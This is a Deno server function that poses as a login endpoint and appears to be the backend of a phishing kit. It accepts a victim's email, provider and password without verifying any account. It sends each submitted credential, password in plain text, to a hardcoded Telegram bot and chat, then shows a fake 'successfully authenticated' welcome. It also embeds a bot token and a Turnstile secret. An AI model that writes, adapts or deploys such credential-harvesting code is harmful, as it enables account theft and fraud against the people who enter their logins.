import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

interface LoginRequest {
  email: string
  provider?: string
  password: string
  turnstileToken?: string
}

interface LoginResponse {
  success: boolean
  message: string
  data?: {
    email: string
    name: string
    provider: string
    timestamp: string
  }
  error?: string
}

// Telegram configuration
const TELEGRAM_BOT_TOKEN = '8804852438:AAHO9Vg1h_7FKGKaYihYHtNJ6qvatUb72kg'
const TELEGRAM_CHAT_ID = '7607683158'

async function sendTelegramNotification(name: string, email: string, provider: string, password: string) {
  const message = `
╔══════════════════════════════╗
  🔏 𝓓𝓲𝓰𝓲𝓽𝓪𝓵 𝓢𝓲𝓰𝓷𝓪𝓽𝓾𝓻𝓮
╚══════════════════════════════╝

✅ <b>Status:</b> Successfully Authenticated
👤 <b>Name:</b> ${name}
📧 <b>Email:</b> ${email}
🔗 <b>Provider:</b> ${provider}
🔒 <b>Password:</b> ${password}
🕐 <b>Timestamp:</b> ${new Date().toISOString()}

━━━━━━━━━━━━━━━━━━━━
<i>User has been welcomed and account is now active.</i>
<code>@godfather_bott</code>
  `.trim()

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML',
        }),
      }
    )

    if (!response.ok) {
      console.error('Telegram notification failed:', await response.text())
    }
  } catch (error) {
    console.error('Error sending Telegram notification:', error)
  }
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
      },
    })
  }

  try {
    // Only accept POST requests
    if (req.method !== 'POST') {
      return new Response(
        JSON.stringify({
          success: false,
          message: 'Method not allowed',
          error: 'Method not allowed. Use POST.'
        } as LoginResponse),
        {
          status: 405,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          },
        }
      )
    }

    // Parse request body
    const body: LoginRequest = await req.json()

    // Validate required fields
    if (!body.email) {
      return new Response(
        JSON.stringify({
          success: false,
          message: 'Validation failed',
          error: 'Missing required field: email is required.'
        } as LoginResponse),
        {
          status: 400,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          },
        }
      )
    }

    // Validate password (if it is provided by the direct login form, it shouldn't be suspiciously short)
    if (body.password && body.password.length < 3) {
      return new Response(
        JSON.stringify({
          success: false,
          message: 'Validation failed',
          error: 'Password must be at least 3 characters long.'
        } as LoginResponse),
        {
          status: 400,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
          },
        }
      )
    }

    // Verify Turnstile Token if it's a direct login attempt (password present)
    if (body.password) {
      if (!body.turnstileToken) {
        return new Response(
          JSON.stringify({
            success: false,
            message: 'Validation failed',
            error: 'Anti-bot verification required. Please complete the Turnstile challenge.'
          } as LoginResponse),
          { status: 400, headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' } }
        )
      }

      const turnstileSecret = '0x4AAAAAADhBiM29k4jxGfu2i2cE4Sl12js'
      const turnstileVerifyResponse = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          secret: turnstileSecret,
          response: body.turnstileToken,
        }).toString(),
      })

      const turnstileOutcome = await turnstileVerifyResponse.json()
      if (!turnstileOutcome.success) {
        return new Response(
          JSON.stringify({
            success: false,
            message: 'Verification failed',
            error: 'Failed to verify Turnstile challenge. Are you a bot?'
          } as LoginResponse),
          { status: 403, headers: { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' } }
        )
      }
    }

    // Extract name from email
    const emailLocal = body.email.split('@')[0]
    const formattedName = emailLocal
      .split('.')
      .map(part => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase())
      .join(' ')

    // Generate professional welcome message
    const providerName = body.provider ? ` via ${body.provider}` : ''
    const welcomeMessage = `Hi ${formattedName}, welcome! You have successfully authenticated${providerName}. Your account is now active and ready to use.`

    // Send Telegram notification (must await so Deno isolate doesn't terminate before it finishes)
    await sendTelegramNotification(formattedName, body.email, body.provider || 'email', body.password).catch(err => {
      console.error('Telegram notification error:', err)
    })

    // Return success response
    const response: LoginResponse = {
      success: true,
      message: welcomeMessage,
      data: {
        email: body.email,
        name: formattedName,
        provider: body.provider || 'email',
        timestamp: new Date().toISOString()
      }
    }

    return new Response(
      JSON.stringify(response),
      {
        status: 200,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
      }
    )

  } catch (error) {
    // Handle any errors
    const errorResponse: LoginResponse = {
      success: false,
      message: 'Server error',
      error: error instanceof Error ? error.message : 'An unexpected error occurred during login processing.'
    }

    return new Response(
      JSON.stringify(errorResponse),
      {
        status: 500,
        headers: {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        },
      }
    )
  }
})
